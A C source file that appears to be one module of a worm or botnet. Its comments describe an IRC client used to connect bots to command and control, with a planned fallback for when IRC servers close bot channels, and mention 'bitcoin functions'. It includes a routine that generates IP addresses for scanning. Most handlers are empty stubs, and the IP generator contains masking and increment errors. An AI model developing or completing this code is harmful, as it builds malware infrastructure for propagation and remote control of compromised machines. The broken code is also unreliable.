/*
irc support

this is going to be irc CLIENT support..

there will be a second module that is specifically for IRC server support
that module will be used to link irc->botlink->irc for bots..
it can be used as a backup in case people start closing irc servers due to bot communications
using it to connect to c&c

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>
#include "list.h"
#include "structs.h"
#include "utils.h"
#include "irc.h"



IRC_Client_Connection *irc_client_list = NULL;

Modules HACK_irc_client = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    6667, 0,
    // required 0, 0..  
    0, 0,
    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &irc_client_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};



// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs irc_client_funcs = {
    NULL, NULL,
    &irc_client_incoming,
    &irc_client_outgoing,
    &irc_client_main_loop,
    &irc_client_connected,
    &irc_client_disconnect // no disconnect since we give away the connections..
};


struct _generation_parameters {
    int param1;
    int param2;
    int param3;
    int param4;
} generation_parameters;

// generate IP addresses in a particular order based on variables 
// for p2p resilency
uint32_t IRC_IPGenerate() {
    uint32_t ret = 0;
    uint32_t a = 0, b = 0, c = 0, d = 0;

    if (generation_parameters.param1 == 0 && generation_parameters.param2 == 0
    && generation_parameters.param3 == 0 && generation_parameters.param4 == 0) {
        // first time.. so lets initailize
                 
    }
    // generate a new IP address determined by the parameters specified
    // this a repetitive incremental system..
    // but since we wanna scan in a different way.. lets start by increasing the 
    // class A bits before class C/D
    a = generation_parameters.param1 << 24;
    b = generation_parameters.param2 << 16;
    c = generation_parameters.param3 << 8;
    d = generation_parameters.param4;
    
    ret = (a & 0xff000000) + (b & 0x00ff000000) + (c & 0x0000ff00) + (d & 0x000000ff);
    
    generation_parameters.param1++;
    generation_parameters.param2++;
    generation_parameters.param3++; 
    generation_parameters.param4++;
    return ret;    
}



// we must ensure connectivity, ping/pong, and determine whther any messages are in queue for distribution
// from p2p
int irc_client_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

// on connect we must generate nickname, user id, and real name
// and push to the server
int irc_client_connected(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}


int irc_client_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int irc_client_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size) {
    
}